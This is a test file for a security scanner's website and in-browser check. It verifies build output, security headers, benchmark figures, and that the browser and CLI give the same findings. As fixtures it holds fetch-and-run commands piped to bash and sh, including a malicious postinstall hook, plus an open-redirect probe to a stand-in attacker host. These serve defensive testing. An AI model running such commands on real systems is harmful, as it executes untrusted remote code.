/**
 * The site's browser check (site/check) runs lib/ in the page. These tests
 * build it the way Vercel does and hold it to the CLI: the same files must
 * give the same findings, and the page must not be able to send them anywhere.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtempSync, rmSync, readFileSync, mkdirSync, writeFileSync, existsSync, readdirSync } from "node:fs";
import { join, dirname } from "node:path";
import { tmpdir } from "node:os";
import { pathToFileURL } from "node:url";
import { buildSite, readNews, readCompare, e10Numbers } from "../site/build.mjs";
import { scanExample } from "../site/tools/example.mjs";
import { COUNTS } from "../scripts/docs-numbers.mjs";
import { activePacks } from "../lib/rules/index.js";
import { serve, headersFor } from "../site/serve.mjs";
import { buildFixtures } from "./fixtures/deps/build.js";
import { scanAgents } from "../lib/agents/index.js";
import { scanSecrets } from "../lib/whitebox/secrets.js";
import { scanDeps } from "../lib/deps/index.js";
import { loadIocs } from "../lib/deps/iocs.js";
import { iocFindings } from "../lib/deps/findings.js";
import { rulesOf } from "../lib/rules/index.js";
import { createServer } from "node:http";
import { fingerprint } from "../lib/crawler.js";
import { runtimeAdvisoriesForRepo, runtimeAdvisoriesForResponse } from "../lib/advisories/index.js";

const ROOT = join(import.meta.dirname, "..");
// The five files the browser check reads.
const KINDS = ["package.json", ".mcp.json", ".claude/settings.json", "CLAUDE.md", "AGENTS.md"];

let dir, out, engine;

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), "penthera-site-"));
  out = join(dir, "dist");
  await buildSite({ out, engine: join(dir, "engine.mjs") });
  engine = await import(pathToFileURL(join(dir, "engine.mjs")).href);
});

afterAll(() => rmSync(dir, { recursive: true, force: true }));

/** The fixture's files of the kinds the page reads, as the page receives them. */
function pageFiles(fixture) {
  return KINDS.filter((p) => existsSync(join(fixture, p))).map((p) => ({ path: p, text: readFileSync(join(fixture, p), "utf8") }));
}

/** The same files alone in a folder, for the CLI. */
function cliFolder(files) {
  const d = mkdtempSync(join(dir, "cli-"));
  for (const f of files) {
    mkdirSync(dirname(join(d, f.path)), { recursive: true });
    writeFileSync(join(d, f.path), f.text);
  }
  return d;
}

const key = (f) => [f.severity, f.templateId || f.method || f.source, f.title, f.description].join(" | ");

describe("site build", () => {
  it("writes the page, the check and its media, with measured numbers filled in", () => {
    for (const f of ["index.html", "check.js", "styles.css", "theme.js", "logo.svg", "favicon.svg", "fonts/DepartureMono-Regular.woff2", "media/hero.mp4", "media/field.png", "media/walkthrough.mp4"]) {
      expect(existsSync(join(out, f)), f).toBe(true);
    }
    const html = readFileSync(join(out, "index.html"), "utf8");
    expect(html).not.toMatch(/\{\{\w+\}\}/);
    expect(html).toMatch(/src="\/check\.js\?v=[0-9a-f]{10}"/);
  });

  it("has share cards for Open Graph and X, with images that exist", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    for (const tag of ['property="og:image"', 'name="twitter:card" content="summary_large_image"', 'property="og:image:width" content="1200"']) {
      expect(html, tag).toContain(tag);
    }
    expect(html).toContain('property="og:title" content="Penthera: your open-source security agent"');
    expect(html).toContain('name="twitter:title" content="Penthera: your open-source security agent"');
    for (const tag of ["og:description", "twitter:description"]) {
      const d = html.match(new RegExp(`(?:property|name)="${tag}" content="([^"]+)"`))[1];
      expect(d.length, tag).toBeLessThanOrEqual(155);
    }
    const img = html.match(/property="og:image" content="([^"]+)"/)[1];
    expect(img).toMatch(/\/media\/social\/og\.png$/);
    for (const f of ["media/social/og.png", "media/social/square.png"]) expect(existsSync(join(out, f)), f).toBe(true);
  });

  it("has a link-preview reel as og:video, beside og:image, and no twitter:player", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const meta = (p) => html.match(new RegExp(`property="${p}" content="([^"]*)"`))?.[1];
    const site = meta("og:url").replace(/\/$/, "");
    expect(meta("og:video")).toBe(`${site}/media/social/reel.mp4`);
    expect(meta("og:video:secure_url")).toBe(meta("og:video"));
    expect(meta("og:video:type")).toBe("video/mp4");
    expect([meta("og:video:width"), meta("og:video:height")]).toEqual(["1200", "630"]);
    // The poster stays: og:image is the fallback where video does not play.
    expect(meta("og:image")).toBe(`${site}/media/social/og.png`);
    expect(html).not.toMatch(/name="twitter:player/);
    const reel = join(out, "media/social/reel.mp4");
    expect(existsSync(reel)).toBe(true);
    const buf = readFileSync(reel);
    expect(buf.length).toBeLessThan(3 * 1024 * 1024);
    // An MP4 whose index (moov) comes before the media (mdat): +faststart.
    expect(buf.subarray(4, 8).toString("latin1")).toBe("ftyp");
    expect(buf.indexOf("moov")).toBeGreaterThan(0);
    expect(buf.indexOf("moov")).toBeLessThan(buf.indexOf("mdat"));
  });

  it("builds absolute og:video URLs from SITE_URL", async () => {
    const dir = mkdtempSync(join(tmpdir(), "penthera-site-url-"));
    const prev = process.env.SITE_URL;
    process.env.SITE_URL = "https://penthera.org/";
    try {
      await buildSite({ out: dir });
      const html = readFileSync(join(dir, "index.html"), "utf8");
      expect(html).toContain('<meta property="og:video" content="https://penthera.org/media/social/reel.mp4">');
      expect(html).toContain('<meta property="og:video:secure_url" content="https://penthera.org/media/social/reel.mp4">');
    } finally {
      if (prev === undefined) delete process.env.SITE_URL;
      else process.env.SITE_URL = prev;
      rmSync(dir, { recursive: true, force: true });
    }
  }, 120_000);

  it("loads nothing from another origin and has no inline script", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    for (const m of html.matchAll(/<(?:script|link|img|video|source|track)\b[^>]*\b(?:src|href)="([^"]+)"/g)) {
      expect(m[1], m[0]).toMatch(/^\//);
    }
    expect(html).not.toMatch(/<script(?![^>]*\bsrc=)[^>]*>/);
    expect(readFileSync(join(out, "styles.css"), "utf8")).not.toMatch(/url\(["']?(https?:)?\/\//);
  });

  it("ships no code that opens a connection", () => {
    const js = readFileSync(join(out, "check.js"), "utf8");
    // lib/deps detects these calls with regexes (fetch\s*\(), so look for the calls themselves.
    for (const api of ["fetch(", "new XMLHttpRequest", "new WebSocket", "sendBeacon(", "new EventSource", "importScripts("]) {
      expect(js.includes(api), api).toBe(false);
    }
  });
});

describe("site FAQ", () => {
  it("is native <details> with a question in each summary, and its numbers come from the repo", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const faq = html.slice(html.indexOf('id="faq"'), html.indexOf("<!-- 9 · Vision -->"));
    const items = faq.match(/<details>\s*<summary>[^<]+\?<\/summary>/g) || [];
    expect(items.length).toBeGreaterThanOrEqual(10);
    // Benchmark figures as bench/RESULTS.md and scripts/docs-numbers.mjs give them.
    const total = readFileSync(join(ROOT, "bench", "RESULTS.md"), "utf8").match(/\| \*\*Total\*\* \|[^|]*\| \*\*(\d+)\*\* \| \*\*(\d+)\*\* \| \*\*(\d+)\*\* \|/);
    const [tp, fp, fn] = total.slice(1).map(Number);
    expect(faq).toContain(`precision ${(tp / (tp + fp)).toFixed(2)} (95% CI`);
    expect(faq).toContain(`from ${tp} true positives, ${fp} false positives and ${fn} misses`);
    expect(faq).toMatch(/one runtime dependency \(yaml\)|\d+ runtime dependencies/);
    expect(faq).not.toMatch(/\{\{\w+\}\}/);
  });
});

describe("site comparison table", () => {
  const cmp = readCompare();
  // The Cloudflare compare page lands with danoszz/penthera#89; until then its
  // links are allowed to point at a file that is not on this branch yet.
  const PENDING = new Set(["docs/compare/cloudflare-security-audit.md"]);
  const repoFile = (s) => s.split("#")[0];

  it("has a sourced cell for every tool in every row, and says where each tool goes further", () => {
    expect(cmp.tools.map((t) => t.id)).toEqual(["penthera", "cloudflare", "semgrep", "snyk", "socket", "zap", "github"]);
    for (const r of cmp.rows) {
      for (const t of cmp.tools) {
        const c = r.cells[t.id];
        if (c.t) expect(c.s.length, `${r.label} / ${t.id}`).toBeGreaterThan(0);
        for (const s of c.s) {
          if (/^https:\/\//.test(s)) continue;
          if (!PENDING.has(repoFile(s))) expect(existsSync(join(ROOT, repoFile(s))), s).toBe(true);
        }
      }
    }
    const further = cmp.rows.find((r) => r.label === "Where it goes further");
    for (const t of cmp.tools) expect(further.cells[t.id].t, t.id).toBeTruthy();
  });

  it("dates each tool as its compare page does", () => {
    for (const t of cmp.tools.filter((x) => x.checked)) {
      if (PENDING.has(t.page) && !existsSync(join(ROOT, t.page))) continue;
      const page = readFileSync(join(ROOT, t.page), "utf8");
      expect(page, t.page).toMatch(new RegExp(`Last checked: ${t.checked}`));
    }
  });

  it("names no winner and never says Penthera finds more", () => {
    const text = cmp.rows.flatMap((r) => Object.values(r.cells).map((c) => c.t || "")).join("\n");
    expect(text).not.toMatch(/\b(best|better|winner|beats|finds more|more accurate|superior)\b/i);
  });

  it("renders every cell with its source, inside its own scroll box", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const sec = html.slice(html.indexOf('id="compare"'), html.indexOf("<!-- 7 · EU rules -->"));
    expect(sec).not.toMatch(/\{\{\w+\}\}/);
    expect(sec).toMatch(/<div class="cmp-scroll" role="region" aria-labelledby="compare-title" tabindex="0">\s*<table class="cmp">/);
    expect(sec.match(/<tr><th scope="row">/g)).toHaveLength(cmp.rows.length);
    const cells = sec.match(/<td[^>]*>[\s\S]*?<\/td>/g);
    expect(cells).toHaveLength(cmp.rows.length * cmp.tools.length);
    for (const c of cells) if (!c.includes("cmp-none")) expect(c).toMatch(/Source: <a href="https:\/\//);
    for (const t of cmp.tools) expect(sec).toContain(`<a href="https://github.com/danoszz/penthera/blob/main/${t.page}">`);
    // Penthera's accuracy is the benchmark's, filled in at build time.
    const total = readFileSync(join(ROOT, "bench", "RESULTS.md"), "utf8").match(/\| \*\*Total\*\* \|[^|]*\| \*\*(\d+)\*\* \| \*\*(\d+)\*\* \|/);
    const [tp, fp] = total.slice(1).map(Number);
    expect(sec).toContain(`Precision ${(tp / (tp + fp)).toFixed(2)} (95% CI`);
  });
});

describe("site before and after", () => {
  it("shows a real scan: site/example.json is what Penthera reports on the test server today", async () => {
    const saved = JSON.parse(readFileSync(join(ROOT, "site", "example.json"), "utf8"));
    expect(await scanExample()).toEqual(saved);
    expect(saved.thirdParty).toBe(0); // the page says every request went to the target
  }, 60_000);

  it("fills in the scan and counts every rule from the repo, without the fix recipes", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const sec = html.slice(html.indexOf('class="ba"'), html.indexOf("<!-- 3 · Get it -->"));
    const e = JSON.parse(readFileSync(join(ROOT, "site", "example.json"), "utf8"));
    expect(sec).not.toMatch(/\{\{\w+\}\}/);
    expect(sec).toContain("yo, is my app safe?");
    for (const s of ["high", "medium", "low"]) if (e.counts[s]) expect(sec).toContain(`${e.counts[s]} ${s}`);
    expect(sec).toContain(`${e.checks} checks, ${e.requests} requests, all to 127.0.0.1.`);
    expect(sec).toContain(`${e.finding.title} <span class="ba-conf">${e.finding.confidence}</span>`);
    expect(sec).toContain("<code>GET /api/oauth/callback?redirect_uri=https://evil-attacker.example/capture</code> returned 302.");
    const packRules = activePacks().reduce((n, p) => n + p.count, 0);
    const rules = COUNTS.urlTemplates + COUNTS.secretPatterns + COUNTS.capabilities + COUNTS.agentRules + packRules;
    expect(sec).toContain(`<span class="ba-n">${rules}</span> readable rules`);
    expect(sec).toContain(`<span class="ba-n">${COUNTS.references}</span> cited sources`);
    expect(sec).toContain(`<span class="ba-n">${(COUNTS.popularNpm + COUNTS.popularPypi).toLocaleString("en-US")}</span> package names`);
    expect(rules).toBeLessThan(1000); // the count is what it is; never round it up
    expect(sec).not.toMatch(/1,?000\+/);
  });
});

describe("site benchmark (E10 pilot)", () => {
  const KV = join(ROOT, "bench", "known-vuln");
  const after = readFileSync(join(KV, "RESULTS-after-fixes.md"), "utf8");
  // "0.10 [0.02, 0.40]" as the reports print it, in the page's "0.02 to 0.40" form.
  const stated = (cell) => { const m = /(\d\.\d\d) \[(\d\.\d\d), (\d\.\d\d)\]/.exec(cell); return { rate: m[1], ci: `${m[2]} to ${m[3]}` }; };
  const cells = (md, label) => md.split("\n").find((l) => l.startsWith(`| ${label} |`)).split("|").map((c) => c.trim());

  it("computes the recall intervals the results file states", () => {
    const e = e10Numbers();
    const table = after.slice(after.indexOf("## Before and after"));
    for (const [label, got] of [["juice-shop", e.apps[0]], ["dvna", e.apps[1]], ["**Pooled recall**", e.pooled]]) {
      const [, , b, a] = cells(table, label);
      for (const [cell, side] of [[b, got.before], [a, got.after]]) {
        expect(cell).toContain(`${side.k}/${side.n}`);
        expect({ rate: side.rate.toFixed(2), ci: side.ci }).toEqual(stated(cell));
      }
    }
    expect(e.pooled.before).toMatchObject({ k: 1, n: 14 });
    expect(e.heldOut).toMatchObject({ name: "WebGoat", k: 2, n: 9, ci: "0.06 to 0.55" });
  });

  it("computes pooled precision as the scorer reports it, before and after", () => {
    const e = e10Numbers();
    for (const [file, got] of [["RESULTS.md", e.precision.before], ["RESULTS-after-fixes.md", e.precision.after]]) {
      const md = readFileSync(join(KV, file), "utf8");
      const row = cells(md.slice(md.indexOf("Run `standard`")), "**Pooled**");
      expect(got.n).toBe(+row[2]); // every finding was labeled or matched the key
      expect({ rate: got.rate.toFixed(2), ci: got.ci }).toEqual(stated(row[7]));
    }
  });

  it("shows the numbers with their caveats and sources, between the walkthrough and the limits", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const e = e10Numbers();
    const sec = html.slice(html.indexOf('id="benchmark"'), html.indexOf("<!-- 6 · Limits -->"));
    expect(html.indexOf("<!-- 4 · Walkthrough -->")).toBeLessThan(html.indexOf('id="benchmark"'));
    expect(sec).not.toMatch(/\{\{\w+\}\}/);
    for (const a of [...e.apps, e.pooled]) {
      expect(sec).toContain(`<p class="stat-num">${a.after.k}/${a.after.n}</p><p class="stat-was">was ${a.before.k}/${a.before.n}</p>`);
      expect(sec).toContain(`95% CI ${a.after.ci}. Before: ${a.before.rate.toFixed(2)}, ${a.before.ci}.`);
    }
    expect(sec).toContain(`<p class="stat-num">2/9</p><p class="stat-was">unchanged</p>`);
    expect(sec).toContain(`Precision stayed level: ${e.precision.before.rate.toFixed(2)} (95% CI ${e.precision.before.ci}) on ${e.precision.before.n} findings before, ${e.precision.after.rate.toFixed(2)} (${e.precision.after.ci}) on ${e.precision.after.n} after.`);
    // The caveats come before the numbers, in the section itself.
    const caveats = sec.indexOf("Read this before the numbers");
    expect(caveats).toBeGreaterThan(0);
    expect(caveats).toBeLessThan(sec.indexOf('class="bench-stats"'));
    for (const c of ["This is a pilot", "the gain is not an independent measure", "WebGoat was held out", "The preregistered studies are what count"]) expect(sec).toContain(c);
    for (const f of ["docs/research/prereg/E10-known-vulnerable-apps.md", "tree/main/bench/known-vuln", "bench/known-vuln/RESULTS.md", "bench/known-vuln/RESULTS-after-fixes.md", "docs/research/prereg/E1-real-world-accuracy.md"]) expect(sec).toContain(f);
    for (const f of ["docs/research/prereg/E10-known-vulnerable-apps.md", "bench/known-vuln/RESULTS.md", "bench/known-vuln/RESULTS-after-fixes.md", "docs/research/prereg/E1-real-world-accuracy.md"]) expect(existsSync(join(ROOT, f)), f).toBe(true);
    // One bar row per app plus the pooled one, drawn without inline styles.
    expect(sec.match(/<div class="e10-row">/g)).toHaveLength(3);
    expect(sec).not.toMatch(/style=/);
  });
});

describe("site news ticker", () => {
  it("every item has a date, one short line and an https source, and the build renders them all", () => {
    const items = readNews();
    expect(items.length).toBeGreaterThan(0);
    const html = readFileSync(join(out, "index.html"), "utf8");
    for (const n of items) {
      expect(html).toContain(`datetime="${n.date}"`);
      expect(n.source).toMatch(/^https:\/\//);
    }
    // Two copies for a seamless loop; the second is hidden and out of the tab order.
    expect(html.match(/class="ticker-list"/g)).toHaveLength(2);
    expect(html).toMatch(/class="ticker-list" aria-hidden="true">.*tabindex="-1"/s);
  });

  it("refuses an item without a source", () => {
    const f = join(dir, "news-bad.json");
    writeFileSync(f, JSON.stringify({ items: [{ date: "2026-10-21", text: "x", source: "http://plain.example" }] }));
    expect(() => readNews(f)).toThrow(/https/);
  });
});

describe("site headers", () => {
  it("vercel.json allows only Vercel's two counters, and forbids framing and plain HTTP", () => {
    const h = headersFor("/");
    const csp = h["Content-Security-Policy"];
    // The only connections: cookieless page views and load times on penthera.org.
    const connect = csp.match(/connect-src ([^;]+)/)[1].trim().split(/\s+/).sort();
    expect(connect).toEqual([
      "https://penthera.org/_vercel/insights/", "https://penthera.org/_vercel/speed-insights/",
      "https://www.penthera.org/_vercel/insights/", "https://www.penthera.org/_vercel/speed-insights/",
    ]);
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("default-src 'none'");
    expect(csp).not.toMatch(/unsafe-(inline|eval)/);
    expect(h["Strict-Transport-Security"]).toMatch(/max-age=\d{8}/);
    expect(h["Referrer-Policy"]).toBe("no-referrer");
  });

  it("the preview server sends them", async () => {
    const server = await serve({ dir: out, port: 0 });
    try {
      const res = await fetch(`http://127.0.0.1:${server.address().port}/`);
      expect(res.status).toBe(200);
      expect(res.headers.get("content-security-policy")).toContain("connect-src https://penthera.org/_vercel/insights/ https://penthera.org/_vercel/speed-insights/ https://www.penthera.org/_vercel/insights/ https://www.penthera.org/_vercel/speed-insights/");
      // The link-preview reel: fetched directly by preview bots, as video/mp4.
      const reel = await fetch(`http://127.0.0.1:${server.address().port}/media/social/reel.mp4`);
      expect(reel.status).toBe(200);
      expect(reel.headers.get("content-type")).toBe("video/mp4");
      await reel.arrayBuffer();
    } finally {
      server.close();
    }
  });
});

describe("browser check, against the CLI", () => {
  for (const name of ["malicious", "clean"]) {
    it(`agents fixture (${name}): the same findings as penthera agents and the secret scan`, async () => {
      const files = pageFiles(join(ROOT, "tests", "fixtures", "agents", name));
      expect(files.length).toBeGreaterThan(0);
      const page = await engine.check(files);
      const d = cliFolder(files);
      const cli = [...(await scanAgents(d)).findings, ...scanSecrets(d)];
      expect(page.findings.map(key).sort()).toEqual(cli.map(key).sort());
      if (name === "malicious") expect(page.counts.critical).toBeGreaterThan(0);
    });
  }

  it("the example the page loads is the malicious fixture", async () => {
    const js = readFileSync(join(out, "check.js"), "utf8");
    expect(js).toContain("curl -s https://example.invalid/bootstrap | bash");
  });

  it("deps fixture: package.json typosquats match penthera deps", async () => {
    const fx = buildFixtures(join(dir, "deps"));
    // The fixture's package.json as npm would have written it: the lockfile's root entry.
    const root = JSON.parse(readFileSync(join(fx.head, "package-lock.json"), "utf8")).packages[""];
    const page = await engine.check([{ path: "package.json", text: JSON.stringify(root, null, 2) }]);
    const cli = await scanDeps(fx.head);
    const typos = (fs) => fs.filter((f) => f.method === "deps-typosquat").map((f) => [f.severity, f.title, f.description].join(" | ")).sort();
    expect(typos(page.findings).length).toBeGreaterThan(0);
    expect(typos(page.findings)).toEqual(typos(cli.findings));
  });

  it("an exact pin of a known-malicious version is flagged, as penthera deps flags it", async () => {
    const rule = rulesOf("ioc-package").find((r) => r.packages.some((p) => p.versions.some((v) => v !== "*")));
    const p = rule.packages.find((x) => x.versions.some((v) => v !== "*"));
    const version = p.versions.find((v) => v !== "*");
    const page = await engine.check([{ path: "package.json", text: JSON.stringify({ name: "app", version: "1.0.0", dependencies: { [p.name]: version } }) }]);
    const expected = iocFindings([{ name: p.name, version, path: "package.json", iocHits: [] }], loadIocs()).map((f) => f.title);
    expect(page.findings.filter((f) => f.method === "deps-ioc").map((f) => f.title)).toEqual(expected);
  });

  it("install scripts declared in package.json, with the same wording as penthera deps", async () => {
    const pkg = { name: "app", version: "1.0.0", scripts: { postinstall: "curl -s https://example.invalid/x | sh" } };
    const page = await engine.check([{ path: "package.json", text: JSON.stringify(pkg, null, 2) }]);
    const f = page.findings.find((x) => x.capabilities?.includes("install-scripts"));
    expect(f.title).toBe("app@1.0.0: runs a risky install script");
    expect(f.description).toContain("npm ci --ignore-scripts");
  });

  it("works out pasted text by its shape", () => {
    expect(engine.guessKind('{"mcpServers":{}}').path).toBe(".mcp.json");
    expect(engine.guessKind('{"hooks":{}}').path).toBe(".claude/settings.json");
    expect(engine.guessKind('{"name":"x","dependencies":{}}').path).toBe("package.json");
    expect(engine.guessKind("# Project notes").path).toBe("CLAUDE.md");
    expect(engine.kindForName("settings.local.json").path).toBe(".claude/settings.json");
    expect(engine.kindForName("README.md")).toBe(null);
  });

  it("runs every bundled rule pack; a pack that is signed verified at build", () => {
    const { packs } = engine.about();
    const bundled = readdirSync(join(ROOT, "lib", "rules"), { withFileTypes: true })
      .filter((d) => d.isDirectory() && existsSync(join(ROOT, "lib", "rules", d.name, "pack.json"))).map((d) => d.name);
    expect(packs.map((p) => p.name).sort()).toEqual(bundled.sort());
    for (const p of packs) {
      const signed = existsSync(join(ROOT, "lib", "rules", p.name, "pack.json.sig"));
      expect(p.signature, p.name).toBe(signed ? "valid" : "missing");
    }
  });
});

describe("browser check, runtime advisories against the CLI", () => {
  const adv = (fs) => fs.filter((f) => f.source === "runtime-advisory").map((f) => [f.severity, f.confidence, f.title, f.description, f.remediation || ""].join(" | "));

  /** A loopback server that answers with these headers; the CLI fingerprints it like any target. */
  async function serveHeaders(lines) {
    const server = createServer((req, res) => {
      for (const [k, v] of lines) res.appendHeader(k, v);
      res.end("");
    });
    await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
    return server;
  }

  const CASES = {
    "PHP 8.3.35 and a session cookie": [["X-Powered-By", "PHP/8.3.35"], ["Set-Cookie", "PHPSESSID=abc; path=/"], ["Set-Cookie", "lang=en"]],
    "PHP 8.3.36": [["X-Powered-By", "PHP/8.3.36"]],
    "an Ubuntu build behind Apache": [["Server", "Apache/2.4.58 (Ubuntu)"], ["X-Powered-By", "PHP/8.3.6-1ubuntu1.4"]],
    "PHPSESSID only": [["Set-Cookie", "PHPSESSID=x"]],
    "end-of-life PHP 8.1": [["X-Powered-By", "PHP/8.1.34"], ["Server", "nginx/1.27.2"]],
  };

  for (const [name, lines] of Object.entries(CASES)) {
    it(`pasted headers, ${name}: the same findings as a URL scan of a server sending them`, async () => {
      const server = await serveHeaders(lines);
      try {
        const fp = await fingerprint(`http://127.0.0.1:${server.address().port}/`);
        const cli = runtimeAdvisoriesForResponse(fp, { url: engine.HEADERS });
        // What `curl -sI` prints for the same response.
        const text = ["HTTP/1.1 200 OK", ...lines.map(([k, v]) => `${k}: ${v}`), "Content-Length: 0", ""].join("\r\n");
        const page = await engine.check([{ path: engine.HEADERS, text }]);
        expect(adv(page.findings)).toEqual(adv(cli));
        expect(cli.length).toBeGreaterThan(0);
      } finally {
        server.close();
      }
    });
  }

  it("the October 2026 PHP release, as the CLI reports it", async () => {
    const one = async (text) => (await engine.check([{ path: engine.HEADERS, text }])).findings.filter((f) => f.source === "runtime-advisory");
    const affected = await one("HTTP/2 200\nx-powered-by: PHP/8.3.35\n");
    expect(affected.flatMap((f) => f.cves || [])).toEqual(expect.arrayContaining(["CVE-2026-109618", "CVE-2026-109619"]));
    // A banner without a distribution token may be a patched package: potential.
    expect(affected.every((f) => f.confidence === "potential")).toBe(true);
    const fixed = await one("HTTP/2 200\nx-powered-by: PHP/8.3.36\n");
    expect(fixed).toHaveLength(1);
    expect(fixed[0]).toMatchObject({ severity: "info" });
    expect(fixed[0].title).toMatch(/has the fix/);
    const docker = (await engine.check([{ path: "Dockerfile", text: "FROM php:8.3.12-fpm\n" }])).findings;
    expect(docker.flatMap((f) => f.cves || [])).toEqual(expect.arrayContaining(["CVE-2026-109618", "CVE-2026-109619"]));
    // An official image is an upstream build: likely.
    expect(docker.filter((f) => f.source === "runtime-advisory" && f.severity === "critical").every((f) => f.confidence === "likely")).toBe(true);
  });

  it("runtime pins: the same findings as penthera --repo on the same files", async () => {
    const files = [
      { path: "Dockerfile", text: "FROM --platform=linux/amd64 php:8.3.12-fpm AS app\nFROM node:${NODE_VERSION}\n" },
      { path: "compose.yaml", text: "services:\n  db:\n    image: \"python:3.12.1-slim\"\n  web:\n    image: php:8.1-apache\n" },
      { path: ".tool-versions", text: "nodejs 20.11.1\n# php 7.4\n" },
      { path: ".php-version", text: "8.3\n" },
      { path: "composer.json", text: JSON.stringify({ require: { php: "^8.1" } }) },
    ];
    const page = await engine.check(files);
    const cli = runtimeAdvisoriesForRepo(cliFolder(files));
    // The same findings; order follows the folder walk, and the page sorts by severity.
    expect(adv(page.findings).sort()).toEqual(adv(cli).sort());
    expect(cli.length).toBeGreaterThan(0);
  });

  it("recognises the new files by name and by shape", () => {
    expect(engine.kindForName("Dockerfile.prod").path).toBe("Dockerfile.prod");
    expect(engine.kindForName("docker-compose.override.yml").path).toBe("docker-compose.override.yml");
    expect(engine.kindForName(".tool-versions").path).toBe(".tool-versions");
    expect(engine.guessKind("FROM php:8.3-apache\n").path).toBe("Dockerfile");
    expect(engine.guessKind('{"require":{"php":"^8.2"}}').path).toBe("composer.json");
    expect(engine.guessKind("services:\n  web:\n    image: php:8.3\n").path).toBe("compose.yaml");
  });
});
